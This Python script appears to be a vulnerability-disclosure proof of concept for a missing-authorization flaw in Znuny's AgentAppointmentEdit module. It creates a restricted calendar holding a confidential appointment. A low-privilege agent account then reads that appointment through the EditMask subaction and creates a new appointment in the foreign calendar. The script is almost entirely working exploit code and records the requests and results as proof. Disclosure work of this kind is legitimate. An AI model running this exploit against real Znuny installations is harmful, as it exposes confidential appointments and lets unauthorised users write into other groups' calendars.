#!/usr/bin/env python3
r"""
VULN-010 — AgentAppointmentEdit missing calendar authorization (disclose + create in foreign calendar)
======================================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentAppointmentEdit.pm:143-172 (EditMask: perm
                  fetched but NEVER enforced), :1554-1558 (create: no AppointmentID => perm block
                  at :1082-1120 skipped)
Vulnerability   : CWE-862 Missing Authorization (IDOR/BAC)

Flaw
----
AgentAppointmentEdit is reachable by any agent (empty Group/GroupRo). EditMask fetches
CalendarPermissionGet but never checks it before rendering the appointment, and the create path
(no AppointmentID) skips the permission block entirely. So any agent reads appointments in, and
creates appointments into, calendars they have no permission on.

Exploit: a calendar in a group the attacker is NOT in, holding a confidential appointment. The
attacker (a) reads it via EditMask (title disclosed) and (b) creates a new appointment in that
foreign calendar via EditAppointment.
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-010", "AgentAppointmentEdit missing calendar authorization",
             ["EditMask fetches but never enforces CalendarPermissionGet (pm:169-172); create skips it (pm:1082)"])
    sfx = C.rid()
    calgrp = C.create_group(f"calgrp010_{sfx}")
    gid = int(C.db(f"SELECT id FROM permission_groups WHERE name='{calgrp}'")[0][0])
    secret = f"CONFIDENTIAL-APPT-{sfx}"
    calname = f"victimcal_{sfx}"
    # CalendarCreate inserts the row but returns empty due to a stale cache; read the id from DB.
    C.perl_eval("$Kernel::OM->Get('Kernel::System::Calendar')->CalendarCreate("
                "CalendarName=>'%s',GroupID=>%d,Color=>'#FF7700',UserID=>1);print 'done';"
                % (calname, gid))
    crows = C.db(f"SELECT id FROM calendar WHERE name='{calname}'")
    if not crows:
        C.failed("calendar row not created")
    cal_id = int(crows[0][0])
    C.cache_delete()   # clear the stale Calendar cache so AppointmentCreate/EditMask resolve it
    aout = C.perl_eval("my $aid=$Kernel::OM->Get('Kernel::System::Calendar::Appointment')->AppointmentCreate("
                       "CalendarID=>%d,Title=>'%s',StartTime=>'2027-01-01 10:00:00',"
                       "EndTime=>'2027-01-01 11:00:00',TimezoneID=>0,UserID=>1);print 'APPT='.($aid//'').';';"
                       % (cal_id, secret))[1]
    m = re.search(r"APPT=(\d+)", aout)
    if not m:
        C.failed(f"appointment setup failed: {aout}")
    appt_id = int(m.group(1))
    C.log("SETUP", f"foreign calendar id={cal_id} (group {calgrp}) with confidential appointment id={appt_id}")

    au, ap = C.create_agent(login=f"att010_{sfx}", groups=["users"])
    auid = C.agent_uid(au)
    a = C.agent_client(au, ap)
    # prove the attacker has NO permission on the foreign calendar
    pc = C.perl_eval("my $C=$Kernel::OM->Get('Kernel::System::Calendar');"
                     "my $p=$C->CalendarPermissionGet(CalendarID=>%d,UserID=>%d);"
                     "print 'PERM=['.($p//'').']';" % (cal_id, auid))[1]
    perm = (re.search(r"PERM=\[([^\]]*)\]", pc) or [None, ""]).__getitem__(1) if re.search(r"PERM=\[([^\]]*)\]", pc) else ""
    C.log("PROOF", f"attacker CalendarPermissionGet on foreign calendar {cal_id} = '{perm}' (empty = no access)")

    tok, _ = a.refresh_token(C.AGENT_URL + "?Action=AgentAppointmentCalendarOverview")

    # (1) READ: EditMask discloses the foreign appointment
    C.log("STEP", f"attacker POST EditMask AppointmentID={appt_id} (foreign calendar)")
    r1 = a.post(data={"Action": "AgentAppointmentEdit", "Subaction": "EditMask",
                      "AppointmentID": appt_id, "ChallengeToken": tok})
    disclosed = secret in r1.text
    C.log("PROOF", f"confidential appointment title '{secret}' disclosed to attacker: {disclosed}")

    # (2) WRITE: create a new appointment in the foreign calendar (no AppointmentID)
    write_marker = f"INJECTED-{sfx}"
    C.log("STEP", f"attacker POST EditAppointment create in foreign calendar {cal_id} (no AppointmentID)")
    r2 = a.post(data={"Action": "AgentAppointmentEdit", "Subaction": "EditAppointment",
                      "ChallengeToken": tok, "CalendarID": cal_id, "Title": write_marker,
                      "StartTime": "2027-02-02 09:00:00", "EndTime": "2027-02-02 10:00:00",
                      "AllDay": "0", "StartYear": "2027", "StartMonth": "2", "StartDay": "2",
                      "StartHour": "9", "StartMinute": "0", "EndYear": "2027", "EndMonth": "2",
                      "EndDay": "2", "EndHour": "10", "EndMinute": "0", "TimezoneID": "0"})
    injected = C.db(f"SELECT id,title FROM calendar_appointment WHERE calendar_id={cal_id} AND title='{write_marker}'")
    C.log("PROOF", f"attacker-created appointment in foreign calendar: {injected}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "POST /znuny/index.pl (EditMask)  Action=AgentAppointmentEdit;Subaction=EditMask;"
        f"AppointmentID={appt_id};ChallengeToken=<attacker>\n"
        "POST /znuny/index.pl (create)   Action=AgentAppointmentEdit;Subaction=EditAppointment;"
        f"CalendarID={cal_id};Title=INJECTED;StartTime=...;ChallengeToken=<attacker>\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"attacker calendar perm='{perm}'\nEditMask disclosed secret={disclosed}\ninjected row={injected}\n")

    if disclosed and injected:
        C.confirmed(f"attacker (no permission on calendar {cal_id}) READ a confidential appointment "
                    f"via EditMask AND CREATED a new appointment in that foreign calendar — "
                    "CalendarPermissionGet is fetched but never enforced.")
    elif disclosed:
        C.confirmed(f"attacker (no permission on calendar {cal_id}) READ a confidential appointment "
                    "via EditMask — CalendarPermissionGet fetched but not enforced (disclosure).")
    else:
        C.failed(f"neither read nor write succeeded: disclosed={disclosed} injected={injected}")

if __name__ == "__main__":
    main()
